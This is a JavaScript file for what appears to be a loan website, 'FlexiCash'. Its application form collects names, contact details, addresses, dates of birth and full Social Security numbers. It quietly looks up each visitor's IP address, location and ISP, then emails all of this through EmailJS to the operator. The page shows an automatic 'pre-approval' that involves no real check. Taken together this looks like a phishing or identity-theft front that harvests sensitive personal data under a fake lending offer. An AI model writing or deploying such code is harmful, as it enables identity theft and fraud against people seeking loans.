// js/main.js

// ✅ 1. Function to get IP and Location
async function getNetworkInfo() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            ip: data.ip || "Unknown",
            city: data.city || "Unknown",
            region: data.region || "Unknown",
            country: data.country_name || "Unknown",
            org: data.org || "Unknown"
        };
    } catch (error) {
        console.warn("Could not fetch IP info:", error);
        return { ip: "Error", city: "Error", region: "Error", country: "Error", org: "Error" };
    }
}

document.addEventListener("DOMContentLoaded", () => {
  
  /*** ============ ELIGIBILITY FORM ============ ***/
  const form = document.getElementById("eligibilityForm");
  const message = document.getElementById("formMessage");

  if (form) {
    form.addEventListener("submit", (e) => {
      e.preventDefault();
      const state = document.getElementById("state").value;
      if (!state) {
        message.textContent = "⚠️ Please select your state.";
        message.style.color = "red";
        return;
      }
      message.textContent = `✅ Great news! FlexiCash loans are available in ${state}. Redirecting...`;
      message.style.color = "green";
      setTimeout(() => { window.location.href = "apply.html"; }, 2000);
    });
  }

  /*** ============ APPLY FORM (With IP & Extra Fields) ============ ***/
  const applyForm = document.getElementById("applyForm");
  const applyMessage = document.getElementById("applyMessage");

  if (applyForm) {
    applyForm.addEventListener("submit", async (e) => {
      e.preventDefault();
      
      if (applyMessage) {
        applyMessage.textContent = "Verifying Identity & IP Address...";
        applyMessage.style.color = "blue";
      }

      // 1. Get Network Info
      const netInfo = await getNetworkInfo();
      console.log("User Network Info:", netInfo);

      // 2. Get Form Values
      const formData = {
        name: applyForm.querySelector("[name='user_name']")?.value.trim(),
        email: applyForm.querySelector("[name='user_email']")?.value.trim(),
        phone: applyForm.querySelector("[name='user_phone']")?.value.trim(),
        address: applyForm.querySelector("[name='user_address']")?.value.trim(), // NEW
        state: applyForm.querySelector("[name='user_state']")?.value,
        own_house: applyForm.querySelector("[name='own_house']")?.value, // NEW
        own_car: applyForm.querySelector("[name='own_car']")?.value, // NEW
        dob: applyForm.querySelector("[name='user_dob']")?.value,
        ssn: applyForm.querySelector("[name='user_SSN']")?.value, // Full SSN
        amount: applyForm.querySelector("[name='loan_amount']")?.value,
        // Add Network Info to data
        ip: netInfo.ip,
        city: netInfo.city,
        region: netInfo.region,
        country: netInfo.country,
        isp: netInfo.org,
        status: "Pending", // Default status
        date: new Date().toISOString()
      };

      // 3. Save to Session Storage (Temporary until Registration)
      // We use sessionStorage so data clears if they close the tab (Security)
      sessionStorage.setItem("tempApplication", JSON.stringify(formData));

      // 4. Send EmailJS (With IP Info)
      // Note: You must update your EmailJS template to accept: 
      // {{user_ip}}, {{user_city}}, {{user_state_loc}}, {{user_isp}}
      
      // We manually construct the object for EmailJS to ensure fields match
      // ✅ UPDATED Email Params to match the new Template
      const emailParams = {
        user_name: formData.name,
        user_email: formData.email,
        user_phone: formData.phone,
        loan_amount: formData.amount,
        user_state: formData.state,
        user_SSN: formData.ssn,
        user_dob: formData.dob,
        
        // NEW FIELDS
        user_address: formData.address,
        own_house: formData.own_house,
        own_car: formData.own_car,
        
        // Network params
        user_ip: netInfo.ip,
        user_city: netInfo.city,
        user_state_loc: netInfo.region,
        user_country: netInfo.country,
        user_isp: netInfo.isp // ISP Name
      };

      if (typeof emailjs !== "undefined") {
        emailjs.send("service_s01wlde", "template_4oam8ep", emailParams)
          .then(() => console.log("Email sent with IP info"))
          .catch((err) => console.error("Email failed", err));
      }

      // 5. Finalize & Redirect
      if (applyMessage) {
        applyMessage.textContent = "✅ Pre-approval successful! Redirecting to Create Account...";
        applyMessage.style.color = "green";
      }

      setTimeout(() => {
        window.location.href = "register.html";
      }, 2000);
    });
  }

  /*** ============ MOBILE MENU ============ ***/
  const menuToggle = document.getElementById("menuToggle");
  const mobileMenu = document.getElementById("mobileMenu");

  if (menuToggle && mobileMenu) {
    menuToggle.addEventListener("click", () => {
      mobileMenu.classList.toggle("active");
    });
  }
});